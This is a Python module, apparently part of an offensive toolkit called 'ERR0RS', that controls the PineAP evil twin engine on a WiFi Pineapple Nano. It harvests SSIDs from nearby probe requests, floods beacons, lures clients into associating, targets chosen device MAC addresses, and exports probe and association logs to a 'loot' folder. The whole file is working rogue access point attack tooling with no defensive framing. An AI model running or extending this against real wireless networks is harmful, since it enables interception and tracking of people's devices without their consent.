"""
ERR0RS PineAP Engine
Full control over the PineAP daemon - the core evil twin/rogue AP engine.
Controls beacon flood, SSID pool, client harvesting, and association.
"""

from .pineapple_client import PineappleClient


class PineAPEngine:
    """
    Control the PineAP daemon on the WiFi Pineapple Nano.

    PineAP is the core attack engine that:
    - Harvests SSIDs from probe requests
    - Broadcasts harvested SSIDs as beacons (beacon flood)
    - Lures clients into connecting to the Pineapple
    - Captures handshakes when clients associate
    """

    def __init__(self, client: PineappleClient):
        self.client = client

    # ------------------------------------------------------------------ #
    #  PINEAP DAEMON CONTROL                                              #
    # ------------------------------------------------------------------ #

    def enable(self) -> dict:
        """Enable the PineAP daemon"""
        return self.client.post("/api/pineap/enable")

    def disable(self) -> dict:
        """Disable the PineAP daemon"""
        return self.client.post("/api/pineap/disable")

    def status(self) -> dict:
        """Get current PineAP status and settings"""
        return self.client.get("/api/pineap/settings")

    def get_settings(self) -> dict:
        """Get all PineAP settings"""
        return self.client.get("/api/pineap/settings")

    def update_settings(self, settings: dict) -> dict:
        """
        Update PineAP settings.
        Common settings:
          autoStart: bool          - Start PineAP on boot
          beaconInterval: int      - Beacon broadcast interval (ms)
          beaconResponsed: bool    - Respond to probe requests
          captureSSIDs: bool       - Harvest SSIDs from probes
          broadcastSSIDs: bool     - Broadcast harvested SSIDs
          allowAssociations: bool  - Allow clients to associate
          logProbes: bool          - Log probe requests
          logAssociations: bool    - Log client associations
          targetMAC: str           - Target specific MAC (or empty for all)
        """
        return self.client.put("/api/pineap/settings", settings)

    # ------------------------------------------------------------------ #
    #  SSID POOL MANAGEMENT                                               #
    # ------------------------------------------------------------------ #

    def get_ssid_pool(self) -> list:
        """Get all SSIDs currently in the PineAP broadcast pool"""
        result = self.client.get("/api/pineap/ssids")
        return result.get("ssids", result)

    def add_ssid(self, ssid: str) -> dict:
        """Add a single SSID to the PineAP broadcast pool"""
        return self.client.post("/api/pineap/ssids", {"ssid": ssid})

    def add_ssids_bulk(self, ssids: list[str]) -> dict:
        """Add multiple SSIDs at once to the pool"""
        results = []
        for ssid in ssids:
            r = self.add_ssid(ssid)
            results.append({"ssid": ssid, "result": r})
        return {"added": len(ssids), "results": results}

    def remove_ssid(self, ssid: str) -> dict:
        """Remove an SSID from the pool"""
        return self.client.delete(f"/api/pineap/ssids/{urllib_quote(ssid)}")

    def clear_ssid_pool(self) -> dict:
        """Clear all SSIDs from the PineAP pool"""
        return self.client.delete("/api/pineap/ssids")

    def import_ssids_from_file(self, filepath: str) -> dict:
        """Load SSIDs from a newline-separated text file into the pool"""
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                ssids = [line.strip() for line in f if line.strip()]
            return self.add_ssids_bulk(ssids)
        except Exception as e:
            return {"success": False, "message": str(e)}

    # ------------------------------------------------------------------ #
    #  BEACON FLOOD                                                       #
    # ------------------------------------------------------------------ #

    def start_beacon_flood(self, ssids: list[str] = None) -> dict:
        """
        Start beacon flooding. Optionally load specific SSIDs first.
        Beacon flood broadcasts all SSIDs in the pool continuously,
        making every nearby device see the Pineapple as many APs at once.
        """
        if ssids:
            self.add_ssids_bulk(ssids)
        return self.update_settings({
            "broadcastSSIDs": True,
            "captureSSIDs": True,
            "beaconResponsed": True,
            "allowAssociations": True,
            "logProbes": True,
            "logAssociations": True
        })

    def stop_beacon_flood(self) -> dict:
        """Stop beacon flooding"""
        return self.update_settings({"broadcastSSIDs": False})

    # ------------------------------------------------------------------ #
    #  CLIENT ASSOCIATION CONTROL                                         #
    # ------------------------------------------------------------------ #

    def allow_associations(self, enable: bool = True) -> dict:
        """Allow or deny clients from associating with the Pineapple"""
        return self.update_settings({"allowAssociations": enable})

    def target_mac(self, mac: str) -> dict:
        """Target a specific client MAC address for PineAP operations"""
        return self.update_settings({"targetMAC": mac})

    def clear_target(self) -> dict:
        """Clear MAC targeting - target all clients"""
        return self.update_settings({"targetMAC": ""})

    # ------------------------------------------------------------------ #
    #  LOGS                                                               #
    # ------------------------------------------------------------------ #

    def get_probe_log(self) -> list:
        """Get log of all probe requests (clients searching for APs)"""
        result = self.client.get("/api/pineap/log/probes")
        return result.get("probes", result)

    def get_association_log(self) -> list:
        """Get log of all client associations"""
        result = self.client.get("/api/pineap/log/associations")
        return result.get("associations", result)

    def clear_logs(self) -> dict:
        """Clear all PineAP logs"""
        return self.client.delete("/api/pineap/log")

    def export_logs(self, output_dir: str = None) -> dict:
        """Export PineAP logs to local loot directory"""
        import json
        from pathlib import Path
        out = Path(output_dir) if output_dir else Path(__file__).parent / "loot"
        out.mkdir(parents=True, exist_ok=True)
        probes = self.get_probe_log()
        assocs = self.get_association_log()
        (out / "probe_log.json").write_text(json.dumps(probes, indent=2))
        (out / "association_log.json").write_text(json.dumps(assocs, indent=2))
        return {
            "success": True,
            "probe_count": len(probes) if isinstance(probes, list) else "?",
            "association_count": len(assocs) if isinstance(assocs, list) else "?",
            "output_dir": str(out)
        }


def urllib_quote(s: str) -> str:
    import urllib.parse
    return urllib.parse.quote(s, safe="")
